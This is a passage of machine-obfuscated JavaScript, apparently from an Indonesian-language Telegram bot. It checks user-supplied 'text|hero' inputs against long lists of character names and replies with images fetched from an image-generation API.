_0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x3f2)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1860)+_0x240d04(0x1a3f)+'ntoh\x20pengg'+_0x240d04(0x2a75))+_0x1ce978['pdgpr'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'alok`'));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x1c5a94=[_0x1ce978['XLqjD'],_0x1ce978[_0x240d04(0x6f1)],_0x1ce978[_0x240d04(0x7ec)],_0x1ce978[_0x240d04(0x113d)],_0x1ce978[_0x240d04(0xbdb)],_0x1ce978[_0x240d04(0x2544)],_0x1ce978['GsUOx'],_0x1ce978[_0x240d04(0x27ca)],_0x1ce978[_0x240d04(0x2524)],_0x1ce978[_0x240d04(0xe1d)],_0x1ce978['SoxlH'],_0x1ce978[_0x240d04(0xe4)],_0x1ce978[_0x240d04(0x55f)],_0x1ce978[_0x240d04(0x1cb7)],_0x240d04(0x820),_0x240d04(0x943),_0x240d04(0x2cbc),_0x1ce978[_0x240d04(0x222d)],_0x240d04(0x237b),_0x1ce978[_0x240d04(0x3f9)],_0x1ce978['BSkRp'],_0x1ce978['lVuns'],_0x240d04(0x19a6),_0x1ce978['NknLV']];if(!_0x1c5a94['includes'](_0x83dd4c))_0x1ce978[_0x240d04(0x654)](_0x555a99,_0x1c5a94,_0x1c5a94[_0x240d04(0x2b45)],_0x1ce978['zjFKN']);else{if(_0x1ce978[_0x240d04(0xd1e)]===_0x1ce978[_0x240d04(0x82b)])return _0x1ce978[_0x240d04(0xce)](_0x1895ea,_0x1ce978[_0x240d04(0x1453)]);else{_0x476bfb(lang[_0x240d04(0x172a)]);let _0x156fbe=_0x1ce978[_0x240d04(0x1b1b)](api,_0x1ce978['WtcHl'],_0x1ce978['ognji'](_0x240d04(0x1dfb)+_0x240d04(0x1d21),_0x3e6565),{'text':_0x2b7b14,'character':_0x83dd4c},_0x240d04(0x23aa)),_0x5c8aaf=await fetch(_0x156fbe);if(!_0x5c8aaf['ok'])throw await _0x5c8aaf[_0x240d04(0x1d8c)]();_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x156fbe},{'caption':lang['ok']});}}}break;case _0x1ce978[_0x240d04(0x521)]:{if(_0x1ce978['JtPxz']!==_0x1ce978[_0x240d04(0x14ea)]){if(!_0x33cfb1)return _0x1ce978['MCfxG'](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x11ab)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1860)+_0x240d04(0x1a3f)+_0x240d04(0x1f79)+_0x240d04(0x2a75))+_0x1ce978[_0x240d04(0x252a)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x258b)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1ddd)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1860)+'acter`\x0a\x0aCo'+_0x240d04(0x1f79)+_0x240d04(0x2a75))+(_0x1ec495+_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x258b)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x54bddc=[_0x1ce978['yHYzc'],_0x1ce978['JgUIS'],_0x240d04(0x34f),_0x240d04(0xce9),_0x1ce978[_0x240d04(0x1944)],_0x1ce978[_0x240d04(0x2c59)],_0x240d04(0x7b2),_0x1ce978[_0x240d04(0x1d6)],_0x1ce978[_0x240d04(0x597)],_0x1ce978[_0x240d04(0xb75)],_0x1ce978[_0x240d04(0x20ad)],_0x1ce978['NPBiW'],_0x1ce978[_0x240d04(0x1438)],_0x1ce978[_0x240d04(0x2235)],_0x1ce978['daxKs'],_0x1ce978[_0x240d04(0x473)],_0x1ce978['HusKn'],_0x1ce978['sLxlZ'],_0x1ce978['AavZj'],_0x1ce978['qwipU'],_0x1ce978['IJfKu'],_0x1ce978[_0x240d04(0x1df5)],_0x240d04(0x1940),_0x1ce978['mLLGx'],_0x1ce978[_0x240d04(0xaf2)],_0x1ce978[_0x240d04(0x2567)],_0x1ce978[_0x240d04(0x9b4)],_0x1ce978[_0x240d04(0xf70)],_0x1ce978[_0x240d04(0x2200)],_0x1ce978['RydPy']];if(!_0x54bddc[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0xb74)](_0x555a99,_0x54bddc,_0x54bddc['length'],_0x240d04(0xc53));else{_0x1ce978['UITJj'](_0x476bfb,lang['wait']);let _0xaa949c=_0x1ce978[_0x240d04(0x188b)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x2a0e)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'character':_0x83dd4c},_0x1ce978['EEoOe']),_0x515ca6=await _0x1ce978[_0x240d04(0x21e)](fetch,_0xaa949c);if(!_0x515ca6['ok'])throw await _0x515ca6['text']();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0xaa949c},{'caption':lang['ok']});}}else _0x199614[_0x240d04(0x1e13)](_0x1ce978['Mgayv'],_0x332b9e);}break;case _0x1ce978[_0x240d04(0x2ba2)]:{if(_0x1ce978['JZLDB'](_0x1ce978[_0x240d04(0x140a)],_0x240d04(0x9bb))){if(!_0x33cfb1)return _0x476bfb('Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1948)](_0x1ec495,_0x3e6565)+('\x20teks|hero'+'`\x0a\x0aContoh\x20'+_0x240d04(0x2d50)+_0x240d04(0x23fb))+_0x1ce978[_0x240d04(0x2377)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0xf8)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x170d)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+(_0x1ec495+_0x3e6565)+(_0x240d04(0xd93)+'`\x0a\x0aContoh\x20'+_0x240d04(0x2d50)+_0x240d04(0x23fb))+_0x1ce978[_0x240d04(0x990)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xf8)));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x350163=[_0x1ce978[_0x240d04(0x201b)],_0x240d04(0xd00),_0x1ce978['qrGlL'],_0x240d04(0x1ccd),_0x240d04(0x2bc8),_0x1ce978[_0x240d04(0xcdd)],_0x240d04(0x1b98),_0x1ce978[_0x240d04(0x2ed2)],_0x1ce978[_0x240d04(0xa15)],_0x1ce978[_0x240d04(0xb45)],_0x240d04(0x2504),_0x240d04(0x227c),_0x240d04(0x19d7),_0x1ce978['enoRi'],_0x1ce978[_0x240d04(0x2926)],_0x240d04(0x8c6),'ilumia-5',_0x1ce978[_0x240d04(0x1ee0)],_0x1ce978[_0x240d04(0x1972)],_0x1ce978[_0x240d04(0x58c)],_0x1ce978['vkzIT'],_0x1ce978[_0x240d04(0x1ed3)],'teemee-3',_0x1ce978[_0x240d04(0x7e9)],'yena-4',_0x1ce978[_0x240d04(0x1e3a)],_0x1ce978['FCtys'],_0x1ce978[_0x240d04(0x9d5)],_0x1ce978[_0x240d04(0x2162)],_0x1ce978[_0x240d04(0x135d)],_0x1ce978[_0x240d04(0xd59)],_0x1ce978[_0x240d04(0xf09)],_0x1ce978[_0x240d04(0x149b)],_0x1ce978['bVYEX'],_0x1ce978[_0x240d04(0x1a28)],_0x1ce978[_0x240d04(0x23b2)],_0x1ce978[_0x240d04(0x13d4)],_0x1ce978['KLaxF'],_0x240d04(0x1b5d),_0x1ce978['eGPOT'],_0x1ce978[_0x240d04(0xa72)],_0x1ce978[_0x240d04(0x1f4a)],_0x1ce978[_0x240d04(0x642)],_0x240d04(0x1413),_0x1ce978[_0x240d04(0x13e7)],_0x1ce978[_0x240d04(0x9ee)],_0x1ce978[_0x240d04(0x1972)],_0x1ce978[_0x240d04(0x141e)],_0x1ce978[_0x240d04(0x1d62)],_0x1ce978[_0x240d04(0x2852)],_0x1ce978[_0x240d04(0x149b)],_0x1ce978[_0x240d04(0xa00)],_0x1ce978[_0x240d04(0x2b51)],_0x1ce978[_0x240d04(0x719)],_0x1ce978[_0x240d04(0x2223)],_0x1ce978[_0x240d04(0x2636)],_0x1ce978[_0x240d04(0x2938)],_0x1ce978['bLEwY'],'quillen-5',_0x1ce978[_0x240d04(0x26be)],'ryoma-6',_0x240d04(0x543),_0x240d04(0x22fd),_0x1ce978['brgPJ'],_0x1ce978[_0x240d04(0x210e)],_0x1ce978[_0x240d04(0x18e2)],_0x1ce978[_0x240d04(0x1704)],_0x1ce978[_0x240d04(0x2791)],_0x1ce978[_0x240d04(0xf3c)],_0x1ce978['RIGlb'],_0x1ce978[_0x240d04(0x393)],_0x1ce978[_0x240d04(0x2930)],_0x1ce978[_0x240d04(0x2919)],_0x240d04(0x2da4),_0x240d04(0x29f),_0x1ce978[_0x240d04(0x2ad1)],_0x240d04(0x709),_0x240d04(0x1258),_0x1ce978[_0x240d04(0x176d)],_0x1ce978[_0x240d04(0x2356)],_0x1ce978[_0x240d04(0x284c)],_0x1ce978[_0x240d04(0x103b)],_0x1ce978[_0x240d04(0xae3)],_0x1ce978[_0x240d04(0x9fb)],_0x240d04(0x1602),_0x1ce978[_0x240d04(0x1b03)],_0x1ce978['kZQJd'],_0x1ce978[_0x240d04(0x17db)],_0x1ce978[_0x240d04(0x20a5)],_0x1ce978['meEmi'],_0x1ce978[_0x240d04(0x977)],_0x1ce978[_0x240d04(0x176)],_0x1ce978['rOxsS'],_0x1ce978['WcEpj'],_0x240d04(0xc2),_0x1ce978[_0x240d04(0x26b1)],_0x240d04(0x567),_0x1ce978[_0x240d04(0x33c)],_0x1ce978[_0x240d04(0x6e2)],_0x1ce978[_0x240d04(0x4d0)],_0x1ce978[_0x240d04(0x14c5)],_0x1ce978[_0x240d04(0x171a)],_0x1ce978['sHooo'],_0x1ce978[_0x240d04(0x1f83)],'qi',_0x240d04(0x1eb3),_0x1ce978[_0x240d04(0x1f50)],_0x1ce978['UOwWL'],_0x1ce978[_0x240d04(0x26af)],_0x1ce978[_0x240d04(0x40d)],_0x1ce978[_0x240d04(0x180b)],_0x1ce978[_0x240d04(0x20d7)],_0x1ce978[_0x240d04(0x2b9f)],_0x1ce978[_0x240d04(0x1c4c)],_0x1ce978[_0x240d04(0xa78)],_0x1ce978[_0x240d04(0x115d)],_0x1ce978[_0x240d04(0x656)],_0x1ce978[_0x240d04(0x14d7)],_0x1ce978[_0x240d04(0x20da)],_0x1ce978[_0x240d04(0x1b4b)],_0x1ce978['CpSKQ'],_0x1ce978[_0x240d04(0x17a5)],_0x1ce978[_0x240d04(0x2ce6)],_0x1ce978['dIsiw'],_0x1ce978[_0x240d04(0x2e12)],'zanis-7',_0x1ce978['QHtde'],_0x1ce978[_0x240d04(0x1e8b)],_0x1ce978[_0x240d04(0x850)],_0x1ce978[_0x240d04(0x2b0c)],_0x1ce978[_0x240d04(0x2c9c)],_0x1ce978['XZkKq'],_0x1ce978[_0x240d04(0xaa3)],_0x1ce978[_0x240d04(0x219c)],_0x1ce978['MolbG'],_0x1ce978[_0x240d04(0x177e)],_0x1ce978[_0x240d04(0x2dee)],_0x1ce978[_0x240d04(0x2c3e)],_0x1ce978[_0x240d04(0x17e7)],_0x1ce978[_0x240d04(0xd7e)],_0x1ce978['rDPoU'],_0x1ce978[_0x240d04(0x23d3)],_0x1ce978[_0x240d04(0x2a53)],_0x1ce978[_0x240d04(0x216e)],_0x1ce978[_0x240d04(0x145c)],_0x240d04(0x168e),_0x1ce978[_0x240d04(0x27ef)],_0x1ce978[_0x240d04(0x2c21)],_0x1ce978['TVqgp'],'veera-3',_0x1ce978[_0x240d04(0x358)],_0x1ce978['bxrGd'],_0x1ce978[_0x240d04(0x2b0e)],_0x240d04(0xc9e),'thane-2',_0x1ce978[_0x240d04(0x2cd9)],_0x240d04(0x800),_0x240d04(0x2d10),_0x1ce978[_0x240d04(0xa79)],_0x240d04(0x289f),_0x1ce978[_0x240d04(0x1164)],_0x1ce978[_0x240d04(0xac2)],_0x1ce978['hcLgI'],_0x240d04(0x5d5),_0x1ce978[_0x240d04(0xeff)],_0x1ce978[_0x240d04(0x2e07)],_0x1ce978[_0x240d04(0x12ea)],_0x240d04(0x28d9),_0x1ce978[_0x240d04(0x2b70)],_0x1ce978[_0x240d04(0x2b01)],_0x1ce978[_0x240d04(0x1ac8)],_0x1ce978[_0x240d04(0xfa2)],_0x1ce978[_0x240d04(0xdda)],_0x1ce978['fBnAn'],_0x240d04(0x1b7a),_0x1ce978['ZAFWH'],_0x240d04(0xfef),_0x1ce978[_0x240d04(0x147e)],_0x1ce978[_0x240d04(0xb0b)],_0x1ce978[_0x240d04(0x2d5)],'butterfly-'+'2',_0x1ce978[_0x240d04(0x55d)],_0x1ce978[_0x240d04(0x1d1b)],_0x240d04(0x2963),_0x1ce978[_0x240d04(0x1320)],'yorn',_0x1ce978[_0x240d04(0x838)],_0x1ce978[_0x240d04(0x71c)],_0x240d04(0x1384),_0x240d04(0x2aa5),_0x1ce978[_0x240d04(0x2493)],_0x1ce978['yYwCX'],_0x240d04(0xc6c),_0x1ce978[_0x240d04(0xcba)],_0x1ce978['epTYu'],_0x1ce978[_0x240d04(0x261f)],_0x240d04(0x1ece),_0x240d04(0x2b6),_0x1ce978['HdmMJ'],_0x240d04(0x17a4),_0x1ce978[_0x240d04(0x139e)],_0x1ce978[_0x240d04(0xb4d)],_0x1ce978['xUSjI'],_0x1ce978[_0x240d04(0x1d3d)],_0x1ce978['ULBVf'],_0x1ce978[_0x240d04(0x1682)],_0x1ce978[_0x240d04(0x24e1)],_0x1ce978[_0x240d04(0x1f5a)],_0x1ce978[_0x240d04(0x595)],_0x1ce978[_0x240d04(0x566)],_0x240d04(0x26de),_0x1ce978['rEZOh'],_0x1ce978[_0x240d04(0x2c09)],_0x1ce978[_0x240d04(0x753)],_0x240d04(0x287c),_0x1ce978['bgnWY'],_0x1ce978[_0x240d04(0x1c47)],_0x1ce978[_0x240d04(0xa4f)],_0x1ce978[_0x240d04(0xdeb)],_0x1ce978[_0x240d04(0x2c75)],_0x1ce978[_0x240d04(0x1f98)],_0x1ce978[_0x240d04(0x183)],_0x1ce978['cfaEi'],_0x1ce978[_0x240d04(0x17c0)],'gildur',_0x1ce978[_0x240d04(0xa52)],_0x1ce978[_0x240d04(0x20b5)],'fennik-2',_0x1ce978['hauuu'],_0x1ce978[_0x240d04(0xd05)],_0x1ce978[_0x240d04(0xc27)],_0x1ce978['fnGKB'],_0x240d04(0x2120),_0x240d04(0x199),_0x1ce978['bZZvI'],'alice-2',_0x1ce978[_0x240d04(0x11bd)],_0x1ce978[_0x240d04(0xc92)],_0x1ce978[_0x240d04(0x2e1f)],_0x1ce978[_0x240d04(0x1f4d)],_0x1ce978['CHVlA'],_0x1ce978[_0x240d04(0x2039)],_0x1ce978['sBvTl'],_0x1ce978[_0x240d04(0x1151)],_0x1ce978['CvEFa'],_0x240d04(0x19fd)+'n-2',_0x1ce978['hXiTa'],_0x240d04(0x1e23),_0x1ce978[_0x240d04(0x9c0)],_0x1ce978['BpLXA'],_0x1ce978[_0x240d04(0x1a66)],_0x1ce978[_0x240d04(0x123f)],_0x1ce978[_0x240d04(0x1381)],_0x1ce978['VfyWy'],'skud',_0x1ce978[_0x240d04(0x14ed)],_0x240d04(0x841),'preyta-3',_0x1ce978[_0x240d04(0x2e49)],_0x1ce978[_0x240d04(0x3a6)],_0x240d04(0x25cf),_0x1ce978[_0x240d04(0x2a3a)],_0x1ce978['yDEGB'],_0x1ce978[_0x240d04(0x560)],_0x240d04(0x28b8),_0x240d04(0x1b1e),_0x1ce978[_0x240d04(0x3d5)],_0x1ce978[_0x240d04(0x1fb9)],_0x1ce978[_0x240d04(0x2e4e)],_0x1ce978['niPgc'],_0x240d04(0x158e),_0x1ce978['FuesI'],_0x1ce978['qZdHO'],_0x1ce978[_0x240d04(0x1769)],_0x1ce978['CBtnA'],_0x240d04(0x2e2e),_0x1ce978[_0x240d04(0x26fb)],_0x1ce978[_0x240d04(0x2847)],_0x1ce978[_0x240d04(0x42b)],_0x240d04(0x1ed8),_0x1ce978[_0x240d04(0x1a61)],_0x1ce978[_0x240d04(0x269e)],_0x1ce978[_0x240d04(0x25c5)],_0x1ce978['taQNX'],_0x1ce978[_0x240d04(0x9c7)],_0x240d04(0x184f),_0x1ce978['aePJQ'],_0x240d04(0x28aa),_0x1ce978[_0x240d04(0x4ba)],_0x1ce978[_0x240d04(0x27f)],_0x1ce978['WDOAq'],_0x1ce978[_0x240d04(0x21b2)],_0x1ce978[_0x240d04(0x2880)],_0x1ce978['FtjzM'],_0x1ce978[_0x240d04(0x8bb)],_0x1ce978[_0x240d04(0x2ba1)],_0x240d04(0x1113),_0x240d04(0x46b),_0x1ce978[_0x240d04(0x2292)],_0x1ce978['hHKEr'],_0x1ce978[_0x240d04(0x2844)],_0x1ce978[_0x240d04(0x9c4)],_0x1ce978[_0x240d04(0x2882)],_0x1ce978['IJXJj'],_0x1ce978[_0x240d04(0x1f8c)],_0x1ce978[_0x240d04(0x125d)],_0x1ce978[_0x240d04(0x2421)],_0x1ce978['dETZh'],_0x1ce978[_0x240d04(0x1812)],_0x1ce978[_0x240d04(0x2e53)],_0x240d04(0x2079),_0x1ce978[_0x240d04(0x87c)],_0x1ce978[_0x240d04(0x1b3d)],_0x1ce978[_0x240d04(0x277e)],_0x1ce978[_0x240d04(0x298e)],_0x1ce978['SIeYP'],_0x1ce978[_0x240d04(0x1d01)],_0x240d04(0x19e0),_0x1ce978['jTgBc'],_0x1ce978[_0x240d04(0x1db2)],'arthur-4',_0x240d04(0xc6f),_0x1ce978[_0x240d04(0x1a0)],_0x1ce978[_0x240d04(0x22dd)],_0x1ce978[_0x240d04(0x2b11)],_0x1ce978[_0x240d04(0x2048)],_0x1ce978[_0x240d04(0x3cc)],_0x1ce978[_0x240d04(0x3c4)],_0x1ce978['LvRpz'],_0x1ce978[_0x240d04(0x10a3)],'narja',_0x1ce978[_0x240d04(0x1de7)],'batman-3',_0x240d04(0xed8),_0x1ce978[_0x240d04(0x1763)],_0x1ce978[_0x240d04(0x182b)],_0x1ce978['LESsj'],_0x1ce978[_0x240d04(0x2099)],'superman-3',_0x1ce978[_0x240d04(0x19a9)],_0x1ce978[_0x240d04(0x13d7)],_0x240d04(0x10d),_0x1ce978[_0x240d04(0x18f0)],_0x1ce978['HPfho'],_0x1ce978[_0x240d04(0x41e)],_0x1ce978[_0x240d04(0x277f)],_0x1ce978[_0x240d04(0x16ff)],_0x1ce978[_0x240d04(0x20f9)],_0x1ce978[_0x240d04(0x241d)],_0x1ce978[_0x240d04(0x1cdb)],_0x1ce978[_0x240d04(0xcb7)],_0x1ce978[_0x240d04(0x556)],_0x1ce978['bPgpW'],_0x1ce978['CkPrP'],_0x1ce978[_0x240d04(0x1751)],_0x1ce978[_0x240d04(0xcf9)],_0x240d04(0x10d2),_0x1ce978['DTcTi'],_0x1ce978[_0x240d04(0xafa)],'amily-2','xeniel-3',_0x1ce978[_0x240d04(0x1ee4)],_0x1ce978[_0x240d04(0x1d49)],'flash-2',_0x1ce978[_0x240d04(0x2ed0)],_0x1ce978[_0x240d04(0x1343)],_0x1ce978[_0x240d04(0x2b5b)],_0x240d04(0x2586),_0x240d04(0x1d63),_0x1ce978[_0x240d04(0x653)],_0x1ce978['DoEnY'],_0x240d04(0x5c0),_0x1ce978[_0x240d04(0x1026)],_0x1ce978['VSSrD'],_0x1ce978[_0x240d04(0x2edf)],'quillen-2',_0x1ce978['gjViR'],_0x1ce978[_0x240d04(0x27db)],_0x1ce978[_0x240d04(0x277a)],_0x1ce978[_0x240d04(0x2b0b)],_0x1ce978[_0x240d04(0x2bf2)],_0x1ce978[_0x240d04(0x783)],'sephera',_0x240d04(0x192f),_0x1ce978[_0x240d04(0xec3)],_0x1ce978[_0x240d04(0x2b9c)],_0x1ce978[_0x240d04(0x1f92)],_0x1ce978[_0x240d04(0x806)],_0x1ce978['dMkrA'],_0x1ce978['NuEfB'],_0x1ce978['ONQbr'],_0x1ce978['bYBqL'],_0x240d04(0xa60),_0x1ce978['yUThB'],_0x240d04(0x29d7),_0x240d04(0x2305),_0x1ce978[_0x240d04(0x3c0)],_0x1ce978[_0x240d04(0x1e88)],_0x1ce978[_0x240d04(0x45b)],_0x1ce978[_0x240d04(0xc5a)],_0x240d04(0x21f),_0x240d04(0x2651),_0x1ce978[_0x240d04(0x1237)],_0x1ce978[_0x240d04(0x103)],_0x1ce978[_0x240d04(0x3c5)],_0x1ce978[_0x240d04(0x20a7)],_0x1ce978['brgPJ'],_0x1ce978['VZUgD'],_0x1ce978['ynDRy'],_0x1ce978[_0x240d04(0x88f)],_0x1ce978[_0x240d04(0xc94)],_0x1ce978[_0x240d04(0x21f5)],_0x240d04(0xdc3),_0x1ce978[_0x240d04(0x1690)],_0x1ce978[_0x240d04(0x2293)],'darcy-2',_0x1ce978[_0x240d04(0x2ca9)],_0x1ce978[_0x240d04(0x2607)],_0x1ce978['GyAjS'],_0x240d04(0x25cd),_0x1ce978[_0x240d04(0x2ea)],_0x1ce978[_0x240d04(0x262f)],_0x1ce978[_0x240d04(0x2966)],_0x1ce978[_0x240d04(0x2b1a)],_0x1ce978[_0x240d04(0x19d0)],_0x240d04(0x1bb6),_0x240d04(0xe60),_0x1ce978[_0x240d04(0x27e3)],_0x1ce978[_0x240d04(0x266c)],'ignis-3',_0x1ce978[_0x240d04(0xc71)],_0x1ce978[_0x240d04(0x22f)],_0x240d04(0x3fc),_0x1ce978[_0x240d04(0x513)],_0x1ce978[_0x240d04(0x2376)],_0x1ce978[_0x240d04(0x20cb)],_0x1ce978[_0x240d04(0x1bbf)],_0x1ce978[_0x240d04(0x1212)],_0x240d04(0x2d45),_0x1ce978[_0x240d04(0x9f1)],_0x1ce978['wfpRc'],_0x1ce978[_0x240d04(0x18d0)],_0x1ce978[_0x240d04(0x1ab4)]];if(!_0x350163[_0x240d04(0x55c)](_0x83dd4c))_0x555a99(_0x350163,_0x350163['length'],_0x1ce978[_0x240d04(0x2a69)]);else{if(_0x1ce978[_0x240d04(0x169)](_0x1ce978['SqYYV'],_0x1ce978[_0x240d04(0x1725)])){_0x1ce978[_0x240d04(0x1ea6)](_0x476bfb,lang['wait']);let _0x488640=_0x1ce978[_0x240d04(0x19a2)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978['wibSs'](_0x1ce978['jrCNG'],_0x3e6565),{'text':_0x2b7b14,'hero':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x43f239=await fetch(_0x488640);if(!_0x43f239['ok'])throw await _0x43f239[_0x240d04(0x1d8c)]();_0x23c0de['replyWithP'+'hoto']({'url':_0x488640},{'caption':lang['ok']});}else return _0x1794d1[_0x240d04(0x15e)](_0x35ec4d),_0x1ce978[_0x240d04(0x253e)](_0x2a74ce,_0x240d04(0x54a)+_0x240d04(0x1e1b)+_0x240d04(0x2394)+_0x240d04(0x1015));}}else return _0x55a232['floor'](_0x1ce978[_0x240d04(0x2512)](_0x56f63c[_0x240d04(0x24f1)](),this));}break;case _0x1ce978[_0x240d04(0x1bd8)]:{if(_0x1ce978[_0x240d04(0x2d68)](_0x240d04(0x415),_0x1ce978[_0x240d04(0x194)]))_0x2faa32('❌\x20Pencaria'+_0x240d04(0x8b4)+_0x240d04(0x1de8)+'ngga\x20teleg'+_0x240d04(0x1159)+_0x240d04(0x555)+'pung\x20nya\x20'+_0xba05b9+'.');else{if(!_0x33cfb1)return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x325)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2769)+_0x240d04(0x1685)+_0x240d04(0x1d12)+_0x240d04(0x2ee2))+_0x1ce978[_0x240d04(0x2a59)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'grakk-6`'));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x22e0)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x265e)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2769)+_0x240d04(0x1685)+'h\x20pengguna'+'an:\x0a`')+_0x1ce978[_0x240d04(0x50d)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'grakk-6`'));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c['split']('|')[0x1];const _0x375fbf=[_0x240d04(0x1ed7),_0x1ce978[_0x240d04(0x273a)],_0x1ce978['qrGlL'],'errol',_0x1ce978[_0x240d04(0x1e84)],_0x1ce978['GCEOL'],_0x240d04(0x1b98),_0x1ce978[_0x240d04(0x1e84)],_0x1ce978['GCEOL'],_0x240d04(0x1b98),_0x1ce978[_0x240d04(0x2ed2)],_0x240d04(0x218a),_0x1ce978[_0x240d04(0xb45)],_0x1ce978[_0x240d04(0x20da)],_0x1ce978[_0x240d04(0x2a4a)],_0x240d04(0x2cc),_0x1ce978[_0x240d04(0x2af)],_0x240d04(0xf65),_0x1ce978[_0x240d04(0x1f7b)],_0x240d04(0x8ce),_0x1ce978['WkvEc'],_0x1ce978[_0x240d04(0x1b31)],_0x1ce978['DJlPq'],_0x1ce978[_0x240d04(0xcf)],_0x1ce978[_0x240d04(0x2cf4)],_0x240d04(0x18ec),_0x240d04(0xcec),_0x1ce978['eVZEM'],_0x1ce978['NfhBD'],_0x1ce978[_0x240d04(0x1336)],_0x1ce978['juyYQ'],_0x1ce978[_0x240d04(0x1893)],_0x1ce978[_0x240d04(0x14bd)],_0x1ce978[_0x240d04(0x2856)],_0x240d04(0x689),_0x1ce978[_0x240d04(0x2122)],_0x1ce978['zqRkK'],_0x1ce978['AbjUu'],_0x1ce978[_0x240d04(0x2850)],_0x1ce978[_0x240d04(0x19f1)],_0x1ce978[_0x240d04(0x1799)],_0x1ce978['aAIGn'],_0x1ce978[_0x240d04(0x1e4f)],_0x1ce978[_0x240d04(0x364)],_0x240d04(0x26b9),_0x240d04(0xc34)+'12',_0x240d04(0x2679),_0x1ce978[_0x240d04(0xa6b)],_0x1ce978['bDqQL'],_0x1ce978[_0x240d04(0x127e)],_0x1ce978[_0x240d04(0x1211)],_0x1ce978['lTpax'],_0x1ce978[_0x240d04(0x309)],_0x1ce978[_0x240d04(0x2926)],_0x1ce978[_0x240d04(0xacd)],_0x1ce978['OqtNu'],_0x240d04(0x2e48),_0x240d04(0x252f),_0x240d04(0x141d),_0x1ce978[_0x240d04(0x338)],_0x240d04(0x1a4c),_0x1ce978[_0x240d04(0x6bc)],_0x1ce978[_0x240d04(0x7e9)],_0x1ce978['Ogfel'],_0x240d04(0x21f3),_0x1ce978['FCtys'],_0x1ce978[_0x240d04(0x9d5)],'laville-2',_0x1ce978[_0x240d04(0x135d)],_0x1ce978[_0x240d04(0xd59)],_0x240d04(0x3d4),_0x1ce978['SqHes'],_0x240d04(0x2d5f),_0x1ce978[_0x240d04(0x1a28)],_0x240d04(0x1d13),_0x1ce978[_0x240d04(0x13d4)],'elsu-6',_0x1ce978[_0x240d04(0x2bc)],_0x1ce978[_0x240d04(0x900)],_0x1ce978[_0x240d04(0xa72)],_0x1ce978[_0x240d04(0x1f4a)],_0x1ce978[_0x240d04(0x642)],_0x1ce978[_0x240d04(0x226)],_0x240d04(0xc7f),_0x1ce978['XfrYK'],'lauriel-8',_0x240d04(0xc23),_0x1ce978['kojjj'],_0x240d04(0x1692),_0x1ce978['lrdii'],_0x1ce978[_0x240d04(0x2b51)],_0x240d04(0x1b28),_0x240d04(0x966),_0x1ce978[_0x240d04(0x2636)],'jinna-5',_0x1ce978[_0x240d04(0x262a)],_0x1ce978['bLEwY'],_0x1ce978[_0x240d04(0x1efa)],_0x1ce978[_0x240d04(0x26be)],_0x1ce978[_0x240d04(0x2a95)],_0x240d04(0x543),_0x1ce978[_0x240d04(0x12e4)],_0x1ce978[_0x240d04(0xd60)],_0x1ce978[_0x240d04(0x210e)],_0x240d04(0x2b3e),_0x240d04(0x7f6),_0x1ce978[_0x240d04(0x2791)],_0x1ce978['rlgPS'],_0x1ce978[_0x240d04(0x556)],_0x1ce978['jFSrY'],_0x1ce978[_0x240d04(0x11a4)],_0x1ce978['ONkcs'],_0x1ce978[_0x240d04(0x9ab)],'arthur-7',_0x1ce978[_0x240d04(0x2e93)],_0x1ce978[_0x240d04(0x2356)],_0x1ce978[_0x240d04(0x284c)],_0x1ce978[_0x240d04(0x103b)],_0x1ce978[_0x240d04(0x48c)],_0x1ce978[_0x240d04(0x176d)],_0x240d04(0x1e70),_0x1ce978[_0x240d04(0x9fb)],'krizzix',_0x240d04(0x18a2),_0x240d04(0x2226),_0x1ce978[_0x240d04(0x17db)],_0x1ce978[_0x240d04(0x20a5)],_0x1ce978['meEmi'],_0x1ce978[_0x240d04(0x977)],_0x1ce978[_0x240d04(0x176)],_0x1ce978[_0x240d04(0x12b2)],_0x1ce978[_0x240d04(0x2549)],_0x1ce978[_0x240d